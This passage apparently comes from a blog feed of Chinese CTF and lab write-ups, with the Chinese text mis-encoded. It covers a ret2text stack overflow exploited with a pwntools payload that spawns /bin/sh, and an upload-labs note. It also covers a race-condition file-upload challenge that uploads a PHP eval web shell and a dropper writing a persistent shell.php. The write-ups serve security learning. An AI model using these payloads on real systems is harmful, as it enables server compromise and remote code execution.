class="hljs-number">0</span>8048617                 call    _rand.text:<span class="hljs-number">0</span>804861C                 mov     [ebp+secretcode], eax.text:<span class="hljs-number">0</span>804861F                 lea     eax, [ebp+input].text:<span class="hljs-number">0</span>8048622                 mov     [esp<span class="hljs-number">+4</span>], eax.text:<span class="hljs-number">0</span>8048626                 mov     dword ptr [esp], offset unk_8048760.text:<span class="hljs-number">0</span>804862D                 call    ___isoc99_scanf.text:<span class="hljs-number">0</span>8048632                 mov     eax, [ebp+input].text:<span class="hljs-number">0</span>8048635                 cmp     eax, [ebp+secretcode].text:<span class="hljs-number">0</span>8048638                 jnz     <span class="hljs-type">short</span> locret_8048646.text:<span class="hljs-number">0</span>804863A                 mov     dword ptr [esp], offset command ; <span class="hljs-string">&quot;/bin/sh&quot;</span>.text:<span class="hljs-number">0</span>8048641                 call    _system </code></pre></div><p>åœ¨<code>secure</code>å‡½æ•°ä¸­æˆ‘ä»¬çœ‹åˆ°äº†å­˜åœ¨è°ƒç”¨<code>system(&quot;/bin/sh&quot;)</code>ï¼Œé‚£æˆ‘ä»¬çš„æ€è·¯å°±æ˜¯åªèƒ½èƒ½è¦†ç›–åˆ°è¿™ä¸ªåœ°å€(å³<code>0x0804863A</code>)ä¸Šå°±å¯ä»¥æ‹¿åˆ°shelläº†ï¼Œç°åœ¨å†æ¥ç¡®å®šæˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶çš„å†…å­˜çš„èµ·å§‹åœ°å€è·ç¦»<code>main</code> å‡½æ•°çš„è¿”å›åœ°å€çš„å­—èŠ‚æ•°ã€‚</p><div class="code-wrapper"><pre><code class="hljs C++">.text:<span class="hljs-number">0</span>80486A7                 lea     eax, [esp<span class="hljs-number">+80</span>h+s].text:<span class="hljs-number">0</span>80486AB                 mov     [esp], eax      ; s.text:<span class="hljs-number">0</span>80486AE                 call    _gets.text:<span class="hljs-number">0</span>80486B3                 mov     dword ptr [esp], offset format ; <span class="hljs-string">&quot;Maybe I will tell you next time !&quot;</span>.text:<span class="hljs-number">0</span>80486BA                 call    _printf.text:<span class="hljs-number">0</span>80486BF                 mov     eax, <span class="hljs-number">0</span>.text:<span class="hljs-number">0</span>80486C4                 leave</code></pre></div><p>ç”¨gefè°ƒè¯•çœ‹çœ‹ï¼Œç°åœ¨<code>call _gets</code>çš„åœ°å€å¤„ä¸‹æ–­ç‚¹ï¼Œç„¶årunä¸€ä¸‹</p><div class="code-wrapper"><pre><code class="hljs C++">~ <span class="hljs-function">gdb ret2text</span><span class="hljs-function">GNU <span class="hljs-title">gdb</span> <span class="hljs-params">(Ubuntu <span class="hljs-number">12.1</span><span class="hljs-number">-0u</span>buntu1~<span class="hljs-number">22.04</span><span class="hljs-number">.2</span>)</span> 12.1</span><span class="hljs-function"><span class="hljs-title">Copyright</span> <span class="hljs-params">(C)</span> 2022 Free Software Foundation, Inc.</span><span class="hljs-function">gefâ¤ b *0x080486AE </span><span class="hljs-function">Breakpoint 1 at 0x80486ae: file ret2text.c, line <span class="hljs-number">24.</span> </span><span class="hljs-function">gefâ¤ r </span><span class="hljs-function">There is something amazing here, do you know anything? Breakpoint <span class="hljs-number">1</span>, <span class="hljs-number">0x080486ae</span> in main () at ret2text.c:<span class="hljs-number">24</span></span><span class="hljs-function"></span><span class="hljs-function">[ Legend: Modified register | Code | Heap | Stack | String ]</span><span class="hljs-function">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ registers â”€â”€â”€â”€</span><span class="hljs-function">$eax   : <span class="hljs-number">0xffffcf6c</span>  â†’  <span class="hljs-number">0xf7fc66d0</span>  â†’  <span class="hljs-number">0x0000000e</span></span><span class="hljs-function">$ebx   : <span class="hljs-number">0xf7fac000</span>  â†’  <span class="hljs-number">0x00229dac</span></span><span class="hljs-function">$ecx   : <span class="hljs-number">0xf7fad9b4</span>  â†’  <span class="hljs-number">0x00000000</span></span><span class="hljs-function">$edx   : <span class="hljs-number">0x1</span></span><span class="hljs-function">$esp   : <span class="hljs-number">0xffffcf50</span>  â†’  <span class="hljs-number">0xffffcf6c</span>  â†’  <span class="hljs-number">0xf7fc66d0</span>  â†’  <span class="hljs-number">0x0000000e</span></span><span class="hljs-function">$ebp   : <span class="hljs-number">0xffffcfd8</span>  â†’  <span class="hljs-number">0xf7ffd020</span>  â†’  <span class="hljs-number">0xf7ffda40</span>  â†’  <span class="hljs-number">0x00000000</span></span><span class="hljs-function">$esi   : <span class="hljs-number">0xffffd094</span>  â†’  <span class="hljs-number">0xffffd1fc</span>  â†’  <span class="hljs-string">&quot;/home/explorer/CTF-Challenge/Pwn/linux/user-mode/s[...]&quot;</span></span><span class="hljs-function">$edi   : <span class="hljs-number">0xf7ffcb80</span>  â†’  <span class="hljs-number">0x00000000</span></span><span class="hljs-function">$eip   : <span class="hljs-number">0x080486ae</span>  â†’  &lt;main<span class="hljs-number">+0066</span>&gt; call <span class="hljs-number">0x8048460</span> &lt;gets@plt&gt;</span><span class="hljs-function">$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]</span><span class="hljs-function">$cs: <span class="hljs-number">0x23</span> $ss: <span class="hljs-number">0x2b</span> $ds: <span class="hljs-number">0x2b</span> $es: <span class="hljs-number">0x2b</span> $fs: <span class="hljs-number">0x00</span> $gs: <span class="hljs-number">0x63</span></span></code></pre></div><ul><li><h4 id="æ ˆå†…å­˜å¸ƒå±€åˆ†æ"><strong>æ ˆå†…å­˜å¸ƒå±€åˆ†æ</strong></h4></li></ul><p><code>buf</code>åœ°å€ï¼š<code>0xffffcd5c</code>(å› ä¸ºå®ƒæ˜¯ç”±Â <code>eax</code>Â å’ŒÂ <code>esp</code>Â æŒ‡å‘)ï¼Œ<code>ebp</code>Â æ˜¯Â <code>0xffffcdc8</code>ï¼Œè€ŒÂ <code>buf</code>Â åœ¨Â <code>0xffffcd5c</code>ï¼Œä¸¤è€…è·ç¦»ä¸ºï¼š0xffffcdc8 - 0xffffcd5c = 0x6c (108 å­—èŠ‚), å› æ­¤ï¼Œè¾“å…¥ 108 å­—èŠ‚åå³å¯è¦†ç›–è¿”å›åœ°å€ã€‚</p><ul><li><h4 id="éªŒè¯çŒœæƒ³"><strong>éªŒè¯çŒœæƒ³</strong></h4><p>é€šè¿‡æˆ‘ä»¬ä¸Šé¢çš„åˆ†æå¯ä»¥æ„é€ ä»¥ä¸‹payload:</p></li></ul><div class="code-wrapper"><pre><code class="hljs Python"><span class="hljs-comment">##!/usr/bin/env python</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *sh = process(<span class="hljs-string">&#x27;./ret2text&#x27;</span>)target = <span class="hljs-number">0x804863a</span>sh.sendline(<span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">108</span> + p32(target))sh.interactive()</code></pre></div><p>å¾—åˆ°ä»¥ä¸‹è¾“å‡ºï¼Œæƒ³æƒ³æ˜¯å“ªé‡Œå‡ºäº†é—®é¢˜å‘¢ï¼Ÿ</p><div class="code-wrapper"><pre><code class="hljs Bash">~ python3 exp.py[+] Starting <span class="hljs-built_in">local</span> process <span class="hljs-string">&#x27;./ret2text&#x27;</span>: pid 1593[*] Switching to interactive modeThere is something amazing here, <span class="hljs-keyword">do</span> you know anything?Maybe I will tell you next <span class="hljs-keyword">time</span> ![*] Got EOF <span class="hljs-keyword">while</span> reading <span class="hljs-keyword">in</span> interactive$ <span class="hljs-built_in">ls</span>[*] Process <span class="hljs-string">&#x27;./ret2text&#x27;</span> stopped with <span class="hljs-built_in">exit</span> code -11 (SIGSEGV) (pid 1593)[*] Got EOF <span class="hljs-keyword">while</span> sending <span class="hljs-keyword">in</span> interactive</code></pre></div><p>åœ¨æ­¤ï¼Œç¬”è€…éœ€è¦åšä¸€ä¸ªå°æç¤ºï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå¯„å­˜å™¨ä¼šå ç”¨æ ˆç©ºé—´ï¼ˆåç»­ä¼šä¸“é—¨å‘æ–‡è¯¦è¿°ï¼‰ï¼Œè€Œåœ¨32ä½æƒ…å†µä¸‹ã€‚æˆ‘ä»¬çš„<code>ebp</code>å ç”¨äº†4å­—èŠ‚ï¼Œæ‰€ä»¥æ­£ç¡®çš„åç§»åœ°å€åº”è¯¥æ˜¯ï¼š</p><div class="code-wrapper"><pre><code class="hljs x86asm">æ€»åç§» = buf åˆ° <span class="hljs-built_in">EBP</span> çš„è·ç¦» (<span class="hljs-number">0x6c</span>) + <span class="hljs-built_in">EBP</span> è‡ªèº«å¤§å° (<span class="hljs-number">4</span>) = <span class="hljs-number">0x70</span> (<span class="hljs-number">112</span>)</code></pre></div><p>å› æ­¤ï¼Œæ­£ç¡®çš„payloadæ˜¯ï¼š</p><div class="code-wrapper"><pre><code class="hljs Python"><span class="hljs-comment">##!/usr/bin/env python</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *sh = process(<span class="hljs-string">&#x27;./ret2text&#x27;</span>)target = <span class="hljs-number">0x804863a</span><span class="hljs-comment"># sh.sendline(b&#x27;A&#x27; * (108+4) + p32(target))</span>sh.sendline(<span class="hljs-string">b&#x27;A&#x27;</span> *(<span class="hljs-number">108</span>+<span class="hljs-number">4</span>) + p32(target))sh.interactive()</code></pre></div><p>è¾“å‡ºå¦‚ä¸‹ï¼š</p><div class="code-wrapper"><pre><code class="hljs Bash">explorer@DESKTOP-JPMNN21:~/CTF-Challenge/Pwn/linux/user-mode/stackoverflow/x86/basic-rop$ python3 exp.py[+] Starting <span class="hljs-built_in">local</span> process <span class="hljs-string">&#x27;./ret2text&#x27;</span>: pid 1766[*] Switching to interactive modeThere is something amazing here, <span class="hljs-keyword">do</span> you know anything?Maybe I will tell you next <span class="hljs-keyword">time</span> !$ <span class="hljs-built_in">ls</span>exp.py  flag  ret2text$ <span class="hljs-built_in">cat</span> flagflag&#123;This_is_the_right_payload&#125;$[*] Interrupted[*] Stopped process <span class="hljs-string">&#x27;./ret2text&#x27;</span> (pid 1766)</code></pre></div><p>ä¸æ–­æ›´æ–°ï¼Œæ•¬è¯·æœŸå¾…ï¼</p><h6 id="å‚è€ƒæ–‡çŒ®åŠç›¸å…³èµ„æ–™æ¥æº">å‚è€ƒæ–‡çŒ®åŠç›¸å…³èµ„æ–™æ¥æº</h6><p><a href="https://ctf-wiki.org/">CTF-Wiki</a><br><a href="https://chat.deepseek.com/">DeepSeek</a></p><script src="https://giscus.app/client.js" data-repo="solkatt-cn/solkatt-cn.github.io" data-repo-id="R_kgDONzaTTQ" data-category="Announcements" data-category-id="DIC_kwDONzaTTc4Cpqn7" data-mapping="pathname" data-strict="0" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>upload-labé¶åœºå°è®¡</title>
    <link href="/2025/02/22/upload-lab%E9%9D%B6%E5%9C%BA%E5%B0%8F%E8%AE%A1/"/>
    <url>/2025/02/22/upload-lab%E9%9D%B6%E5%9C%BA%E5%B0%8F%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h2 id="upload-labsé¶åœºå­¦ä¹ å°è®°">upload-labsé¶åœºå­¦ä¹ å°è®°</h2><h6 id="upload-labsé¶åœºé¡¹ç›®åœ°å€-https-github-com-c0ny1-upload-labs">upload-labsé¶åœºé¡¹ç›®åœ°å€: <a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></h6><p>å…ˆæ¥çœ‹Pass-01</p><p>é¢˜ç›®æè¿°æ˜¯<code>æœ¬passåœ¨å®¢æˆ·ç«¯ä½¿ç”¨jså¯¹ä¸åˆæ³•å›¾ç‰‡è¿›è¡Œæ£€æŸ¥ï¼</code>æˆ‘ä»¬å¯ä»¥æå–å…¶ä¸­çš„å…³é”®è¯<code>js</code>äºæ˜¯è®¾æƒ³ä½¿ç”¨æµè§ˆå™¨ç¦ç”¨jsæ¥å®ç°ç»•è¿‡ï¼Œä»¥chromeæµè§ˆå™¨ä¸ºä¾‹</p><p>è¿™é‡Œæœ‰ä¸€å¼ å›¾ç‰‡ Â·</p><p>ä¸Šä¼ å¹¶è§£ææˆåŠŸ</p><p>è¿™æœ‰ä¸€å¼ å›¾ç‰‡</p><p>ç„¶åæ˜¯Pass-02</p><p>é¢˜ç›®æè¿°ä¸º<code>æœ¬passåœ¨æœåŠ¡ç«¯å¯¹æ•°æ®åŒ…çš„MIMEè¿›è¡Œæ£€æŸ¥ï¼</code>æˆ‘ä»¬å°è¯•æŠŠæ•°æ®åŒ…æˆªå–ä¸‹æ¥è¿›è¡Œç®€å•åˆ†æ</p><script src="https://giscus.app/client.js" data-repo="solkatt-cn/solkatt-cn.github.io" data-repo-id="R_kgDONzaTTQ" data-category="Announcements" data-category-id="DIC_kwDONzaTTc4Cpqn7" data-mapping="pathname" data-strict="0" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>]]></content>
    
    
    <categories>
      
      <category>Webå®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å®‰å…¨æ—¥å¿—</tag>
      
      <tag>Webå®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ¡ä»¶ç«äº‰æ¼æ´å­¦ä¹ </title>
    <link href="/2025/02/08/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <url>/2025/02/08/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="Webå®‰å…¨æ¡ä»¶ç«äº‰æ¼æ´å­¦ä¹ ">Webå®‰å…¨æ¡ä»¶ç«äº‰æ¼æ´å­¦ä¹ </h2><h4 id="0x00-æ¦‚è¿°">0x00 æ¦‚è¿°</h4><p>â€‹æ¡ä»¶ç«äº‰æ¼æ´å‘ç”Ÿåœ¨å¤šä¸ªçº¿ç¨‹åŒæ—¶è®¿é—®åŒä¸€ä¸ªå…±äº«ä»£ç ã€å˜é‡ã€æ–‡ä»¶ç­‰ï¼Œï¼Œç”±äºå¤šä¸ªä¸åŒçº¿ç¨‹åŒæ—¶ä¸ç›¸åŒçš„æ•°æ®è¿›è¡Œäº¤äº’ï¼Œä»è€Œå¯¼è‡´ç¢°æ’å†²çªï¼ˆä¾‹å¦‚ï¼Œåç«¯å¤šä¸ªçº¿ç¨‹åŒæ—¶ä¿®æ”¹æ•°æ®åº“ä¸­çš„æŸä¸€ä¸ªå­—æ®µå€¼ï¼‰ã€‚æ”»å‡»è€…é€šè¿‡ç²¾å¿ƒå®šåˆ¶è¯·æ±‚åˆ°è¾¾åç«¯çš„æ—¶é—´æ•…æ„åˆ¶é€ å†²çªï¼Œå¹¶ç”±æ­¤å®ç°æ¶æ„ç›®çš„ã€‚è¿™ä¸ªæ¼æ´å­˜åœ¨äºæ“ä½œç³»ç»Ÿã€æ•°æ®åº“ã€webç­‰å¤šä¸ªå±‚é¢ï¼Œç”±äºå¤§å¤šæœåŠ¡ç«¯æ¡†æ¶åœ¨å¤„ç†ä¸åŒç”¨æˆ·çš„è¯·æ±‚æ—¶æ˜¯å¹¶å‘è¿›è¡Œçš„ï¼Œè€Œå¼€å‘è€…åœ¨è¿›è¡Œä»£ç å¼€å‘æ—¶å¸¸å¸¸å€¾å‘äºè®¤ä¸ºä»£ç ä¼šä»¥çº¿æ€§çš„æ–¹å¼æ‰§è¡Œï¼Œè€Œå¿½è§†äº†å¹¶è¡ŒæœåŠ¡å™¨ä¼šå¹¶å‘æ‰§è¡Œå¤šä¸ªçº¿ç¨‹ï¼Œè¿™å°±ä¼šå¯¼è‡´æ„æƒ³ä¸åˆ°çš„ç»“æœã€‚</p><h6 id="ç®€å•æ¥è¯´ï¼Œå°±æ˜¯å¤šçº¿ç¨‹åŒæ—¶æ“ä½œä¸€ä¸ªå¯¹è±¡ï¼Œè€Œæ²¡æœ‰å¯¹å¯¹è±¡è¿›è¡ŒåŠ é”ç­‰ä¿è¯ä¸€è‡´æ€§çš„æ“ä½œ">ç®€å•æ¥è¯´ï¼Œå°±æ˜¯å¤šçº¿ç¨‹åŒæ—¶æ“ä½œä¸€ä¸ªå¯¹è±¡ï¼Œè€Œæ²¡æœ‰å¯¹å¯¹è±¡è¿›è¡ŒåŠ é”ç­‰ä¿è¯ä¸€è‡´æ€§çš„æ“ä½œ</h6><h4 id="0x01-ç®€å•åˆ†æ">0x01 ç®€å•åˆ†æ</h4><p>æˆ‘ä»¬æ¥è®¾è®¡ä¸€ä¸ªç®€ç­”çš„ä¸šåŠ¡é€»è¾‘ï¼šå•†åŸç³»ç»Ÿä¸­ï¼Œç”¨æˆ·æäº¤æŠ˜æ‰£ç ï¼Œåç«¯ä¼šæ£€æµ‹ç”¨æˆ·æ˜¯å¦å·²ç»ä½¿ç”¨è¿‡æŠ˜æ‰£ç ã€‚è‹¥æœªä½¿ç”¨è¿‡ï¼Œåˆ™ä½¿ç”¨è¯¥æŠ˜æ‰£ç ï¼Œå¹¶è®°å½•æŠ˜æ‰£ç ä½¿ç”¨çŠ¶æ€ä¸ºTrueã€‚è‹¥å·²ä½¿ç”¨æŠ˜æ‰£ç ï¼Œç”¨æˆ·å†æ¬¡ä½¿ç”¨æŠ˜æ‰£ç æ—¶ï¼Œåç«¯ç¨‹åºè¯»å–æŠ˜æ‰£ç ä½¿ç”¨çŠ¶æ€ä¸ºTrueï¼Œæ‹’ç»ç”¨æˆ·å†æ¬¡ä½¿ç”¨æŠ˜æ‰£ç ã€‚</p><p><img src="https://pic2.zhimg.com/80/v2-ffffaa1fb957682cebb626a0482344b3_720w.webp" alt="Lesson-eb3846115f6b8"></p><p>æˆ‘ä»¬åœ¨è¿™é‡Œç”¨ä¸€æ®µç®€å•çš„pythonä»£ç æ¥æ¨¡æ‹Ÿåç«¯é€»è¾‘ï¼Œå¤„ç†è¯·æ±‚çš„<code>handle_req()</code>å‡½æ•°æ˜¯å¹¶å‘ï¼ˆå¤šçº¿ç¨‹/å¤šè¿›ç¨‹ï¼‰æ‰§è¡Œçš„ï¼š</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">def</span> **handle_req**():    <span class="hljs-keyword">if</span> code_already_used = <span class="hljs-literal">False</span>: <span class="hljs-comment"># åˆ¤æ–­å¦‚æœæ²¡æœ‰ä½¿ç”¨è¿‡æŠ˜æ‰£ç ï¼ˆå®é™…åº”è¯¥æ˜¯å¯¹æ•°æ®åº“çš„æŸ¥è¯¢ï¼Œæ­¤å¤„ç®€åŒ–å†™æ³•ï¼‰</span>        use_code()  <span class="hljs-comment"># ä½¿ç”¨æŠ˜æ‰£ç ï¼Œå¯¹å•†å“è¿›è¡Œæ‰“æŠ˜</span>        code_already_used = <span class="hljs-literal">True</span>  <span class="hljs-comment"># ä½¿ç”¨è¿‡æŠ˜æ‰£ç åï¼Œå°†æŠ˜æ‰£ç ä½¿ç”¨çŠ¶æ€ä¸ºTrueï¼ˆå®é™…åº”è¯¥æ˜¯å¯¹æ•°æ®åº“çš„æ•°æ®æ›´æ–°ï¼Œæ­¤å¤„ç®€åŒ–å†™æ³•ï¼‰</span>    <span class="hljs-keyword">else</span>:  <span class="hljs-comment"># è‹¥å·²ç»ä½¿ç”¨è¿‡æŠ˜æ‰£ç </span>        reject_use_code()        <span class="hljs-comment"># æ‹’ç»å†æ¬¡ä½¿ç”¨æŠ˜æ‰£ç </span></code></pre></div><p>ä½†æ˜¯è¿™ä¸ªè¿‡ç¨‹å¯èƒ½ä¼šå­˜åœ¨æ¡ä»¶ç«äº‰æ¼æ´ï¼Œå› ä¸ºæˆ‘ä»¬ç¬¬ä¸€æ¬¡è¯·æ±‚åˆ¤æ–­çš„çŠ¶æ€ä¸ºfalseå³æœªä½¿ç”¨æŠ˜æ‰£ç ï¼Œä½†æ˜¯ç¬¬ä¸€ä¸ªè¯·æ±‚æ‰§è¡Œåˆ°ç¬¬å››è¡Œæ—¶å‡†å¤‡æ›´æ–°æ•°æ®åº“å†…å®¹è€Œç¬¬äºŒä¸ªè¯·æ±‚åˆå¼€å§‹æ‰§è¡Œå¹¶å°†æŠ˜æ‰£ç ä½¿ç”¨çŠ¶æ€å†ä¸€æ¬¡åœ°æ ‡è®°ä¸ºfalseï¼Œä»è€Œé€ æˆäº†ä½¿ç”¨äº†ä¸¤æ¬¡æŠ˜æ‰£ç ï¼Œè§¦å‘äº†æ¡ä»¶ç«äº‰æ¼æ´ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼šåç«¯å°†è®°å½•æŠ˜æ‰£ç ä½¿ç”¨çŠ¶æ€ä¸ºTrueä¹‹å‰ï¼Œå¯èƒ½å­˜åœ¨æ¡ä»¶ç«äº‰ï¼Œä¸Šè¿°ç¬¬2ã€3è¡Œä»£ç æ‰§è¡Œçš„æ—¶é—´å°±æ˜¯<code>ç«äº‰çª—å£</code>ã€‚</p><p><img src="https://pica.zhimg.com/80/v2-b3ccc0bc7165f6bd90fcf6769c591786_720w.webp" alt="Lesson-eb3846115f6b8"></p><p>ç«äº‰çª—å£ä¸€èˆ¬æ˜¯ä¸€æ®µå¾ˆçŸ­çš„æ—¶é—´æ®µï¼ˆå‡ æ¯«ç§’ç”šè‡³æ›´çŸ­ï¼‰ï¼Œç”¨æˆ·é€šè¿‡å¹¶è¡Œå‘é€å¤šä¸ªæ•°æ®åŒ…ï¼Œä½¿å¾—æœåŠ¡ç«¯ç«äº‰çª—å£å†…æ‰§è¡Œå¤šæ¬¡ç‰¹å®šçš„åŠŸèƒ½ã€‚</p><p><img src="https://pic4.zhimg.com/80/v2-936e0bec041297e3b7f8b1f0d9f568d1_720w.webp" alt="Lesson-eb3846115f6b8"></p><h4 id="0x02-CTFä¸­çš„æ¡ä»¶ç«äº‰">0x02 CTFä¸­çš„æ¡ä»¶ç«äº‰</h4><p>æˆ‘ä»¬æ¥çœ‹è¿™æ ·çš„ä¸€é“é¢˜ç›®</p><p>ã€é¢˜å‹ã€‘<a href>Web</a><br>ã€é¢˜ç›®ã€‘<code>wzsc_æ–‡ä»¶ä¸Šä¼ </code><br>ã€æ¥æºã€‘ï¼ˆ[æ”»é˜²ä¸–ç•Œ](<a href="https://adworld.xctf.org.cn/challenges/list%EF%BC%89">https://adworld.xctf.org.cn/challenges/listï¼‰</a><br>ã€æ€è·¯ã€‘<a href>æ¡ä»¶ç«äº‰</a></p><p>æˆ‘ä»¬å…ˆä¸Šä¼ ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬å¹¶æŠŠåŒ…æ‹¦æˆªä¸‹æ¥è¿›è¡Œåˆ†ææµ‹è¯•</p><div class="code-wrapper"><pre><code class="hljs bash">POST /upload.php HTTP/1.1Host: Host:PortContent-Length: 230Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://61.147.171.105:56903Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryMwWBoiGSKcfAYxLhUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: Host:PortAccept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9Connection: close------WebKitFormBoundaryMwWBoiGSKcfAYxLhContent-Disposition: form-data; name=<span class="hljs-string">&quot;file&quot;</span>; filename=<span class="hljs-string">&quot;classic.php&quot;</span>Content-Type: application/octet-stream&lt;?php @<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;shell&quot;</span>]); ?&gt;------WebKitFormBoundaryMwWBoiGSKcfAYxLh--</code></pre></div><p>æˆ‘ä»¬æŠŠå®ƒæ”¾åˆ°Repeaterä¸­æ”¾å‡ºå»çœ‹çœ‹ï¼ŒæŸ¥çœ‹è¿”å›åŒ…</p><div class="code-wrapper"><pre><code class="hljs bash">HTTP/1.1 200 OKDate: Sat, 08 Feb 2025 09:38:03 GMTServer: Apache/2.4.18 (Ubuntu)Content-Length: 0Connection: closeContent-Type: text/html; charset=UTF-8</code></pre></div><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„çŠ¶æ€ç æ˜¯200ï¼Œè¯æ˜æˆ‘ä»¬æ˜¯å¯ä»¥æˆåŠŸä¸Šä¼ ä½†æ˜¯åœ¨æœåŠ¡å™¨ä¸­è¢«åˆ é™¤äº†ï¼Œé‚£è¿™æ—¶å€™å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ€è·¯</p><p>æˆ‘ä»¬å…ˆå°è¯•è®¿é—®æˆ‘ä»¬ä¸Šä¼ çš„ä¸€å¥è¯å¹¶æ‹¦æˆªåŒ…</p><div class="code-wrapper"><pre><code class="hljs bash">GET /upload/classic.php HTTP/1.1Host: 61.147.171.105:56903Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9Connection: close</code></pre></div><p>è¿™æ ·ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨<code>BurpSuite</code>ä¸­åŒæ—¶æ‹¦æˆªä¸‹è¿™ä¸¤ä¸ªæ•°æ®åŒ…ï¼Œç„¶åå‘é€è‡³Intruderæ¨¡å—ï¼Œå°†payloadè®¾ç½®ä¸º<code>Null Payload</code>ï¼Œå¹¶å¼€å§‹æ”»å‡»ï¼Œè¿™æ ·æˆ‘ä»¬è¿˜éœ€è¦æ­é…ä¸Šè¿™æ ·çš„ä¸€å¥PHPä»£ç </p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;shell.php&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>), <span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;shell&quot;]); ?&gt;&#x27;</span>); <span class="hljs-meta">?&gt;</span></code></pre></div><p>å®ƒçš„ä½œç”¨æ˜¯åªè¦æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶èƒ½è¢«æˆåŠŸè®¿é—®ï¼Œå®ƒå°±èƒ½åœ¨æœåŠ¡å™¨ä¸Šæ–°å»ºä¸€ä¸ª<code>shell.php</code>å¹¶å°†ä¸€å¥è¯å†™å…¥ï¼Œä»è€Œä½¿æˆ‘ä»¬èƒ½å¤ŸæˆåŠŸ<code>getshel</code>l~</p><p>ç”¨ä¸¤ä¸ªä¸åŒçš„æ•°æ®åŒ…è®¾ç½®<code>Null Payload</code>çš„ä½œç”¨æ˜¯åˆ©ç”¨æˆ‘ä»¬æåˆ°çš„â€œç«äº‰çª—å£â€å³ä¸Šä¼ æˆåŠŸåˆ°è¢«åˆ é™¤çš„è¿™ä¸€å°æ®µæ—¶é—´å»è®¿é—®æˆ‘ä»¬ä¸Šä¼ çš„å†…é¬¼è®©å…¶åœ¨æœåŠ¡å™¨ä¸Šç”Ÿæˆä¸€ä¸ªæ¥åº”æˆ‘ä»¬çš„shellï¼Œå…¶å®ç®€å•åœ°è¯´å°±æ˜¯ç”¨ä¸¤ä¸ªä¸åŒçš„æ“ä½œå»åŒæ—¶è¯»å†™ä¸€ä¸ªæ–‡ä»¶</p><p><img src="https://pic2.zhimg.com/80/v2-98252be57cdc6ace37d120354c2b5da1_720w.webp" alt="4"></p><p>Success to uploadï¼</p><p>æˆåŠŸæ‹¿åˆ°flagï¼š<code>cyberpeace&#123;This_is_a_sample_flag&#125;</code></p><h4 id="0x03-å¦‚ä½•é˜²å¾¡ï¼Ÿ">0x03 å¦‚ä½•é˜²å¾¡ï¼Ÿ</h4><p>ä»¥ä¸‹æ€»ç»“äº†ä¸€äº›é˜²å¾¡æ–¹æ³•å’Œå¸¸è§æ¡ä»¶ç«äº‰æ¼æ´ç¤ºä¾‹åŠé˜²å¾¡</p><p>(1) ä½¿ç”¨åŒæ­¥æœºåˆ¶<br>é”ï¼ˆLockï¼‰ï¼šé€šè¿‡åŠ 